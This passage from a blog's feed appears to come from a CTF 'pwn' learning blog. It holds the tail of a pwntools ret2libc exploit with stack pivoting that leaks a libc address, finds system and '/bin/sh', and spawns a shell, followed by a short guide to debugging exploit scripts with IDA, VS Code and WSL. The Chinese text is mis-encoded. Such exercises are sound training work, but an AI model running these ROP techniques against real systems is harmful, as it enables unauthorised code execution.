class="number">0x40</span>)+pData+pReadbuf</span><br><span class="line">p.send(payload1) <span class="comment">#ä¿®æ”¹rbp</span></span><br><span class="line"></span><br><span class="line">payload2 = pPop_rdi+p64(libc_start_main_got)+pPuts+pRet+pReadbuf+cyclic(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sendRop1(p,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = pPop_rdi + p64(binsh_addr) +pRet+p64(system_addr)+cyclic(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendRop2(p,payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å­¦PWNï¼ŒQAQ</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ret2libc" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/"/>
    
    <category term="æ ˆè¿ç§»" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    
    <category term="pwn" scheme="https://www.pri87.vip/tags/pwn/"/>
    
    <category term="æ ˆ" scheme="https://www.pri87.vip/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>IDA-vscode-wslè”åˆè°ƒè¯•pwné¢˜çš„expè„šæœ¬</title>
    <link href="https://www.pri87.vip/posts/ac1dbd3e.html"/>
    <id>https://www.pri87.vip/posts/ac1dbd3e.html</id>
    <published>2025-01-03T13:12:10.000Z</published>
    <updated>2025-01-03T13:29:24.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èµ·å› ">èµ·å› </h2><p>ä½œä¸ºåªä¼šç”¨IDAè°ƒè¯•çš„å°Š(fei)è´µ(wu)REæ‰‹ï¼Œè°ƒpwnçš„expç”¨gdbå®åœ¨ç”¨ä¸æ¥QAQï¼Œæ‰€ä»¥æƒ³äº†ä¸ªåŠæ³•</p><h2 id="ç¯å¢ƒ">ç¯å¢ƒ</h2><ul><li>wsl2-Ubuntu</li><li>IDA8.3</li><li>vscodeåŠpythonæ’ä»¶</li><li>pwné¢˜å’Œå¯¹åº”çš„exp</li></ul><h2 id="æ­¥éª¤">æ­¥éª¤</h2><p>wslä¸­åœ¨é¢˜ç›®ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code .</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸»æœºæœ‰vscodeåº”è¯¥ä¼šè¢«å”¤é†’ï¼Œç„¶åæ‰§è¡Œwslçš„vscode serverçš„å®‰è£…ï¼Œå®‰è£…å®Œåï¼Œå¯ä»¥åœ¨wslä¸­ä½¿ç”¨vscode<br>ç„¶ååœ¨æ’ä»¶ä¸­å®‰è£…è°ƒè¯•pythonçš„æ’ä»¶</p><p>å°†idaserveræ”¾å…¥wslä¸­ï¼Œå¯åŠ¨</p><p>ç”¨wslä¸­çš„vscodeå¯åŠ¨è°ƒè¯•ï¼Œæ–­ç‚¹æ–­åœ¨<code>p = process(xxx)</code>ä¹‹å</p><p>idaé™„åŠ ï¼Œåœ¨è¿›ç¨‹åˆ—è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹</p><p>ç„¶åæ„‰å¿«åœ°å¼€å§‹è°ƒè¯•ï¼Œæ³¨æ„ä¸¤è¾¹è¦ä¸€èµ·è°ƒ</p>]]></content>
    
    
    <summary type="html">è¿™ç¯‡è¯¥æ”¾REè¿˜æ˜¯pwnå‘¢QAQ</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="å®è·µ" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="è®°å½•" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/"/>
    
    <category term="ç¯å¢ƒé…ç½®" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="è°ƒè¯•" scheme="https://www.pri87.vip/tags/%E8%B0%83%E8%AF%95/"/>
    
    <category term="ida" scheme="https://www.pri87.vip/tags/ida/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/tags/pwn/"/>
    
  </entry>
  
</feed>
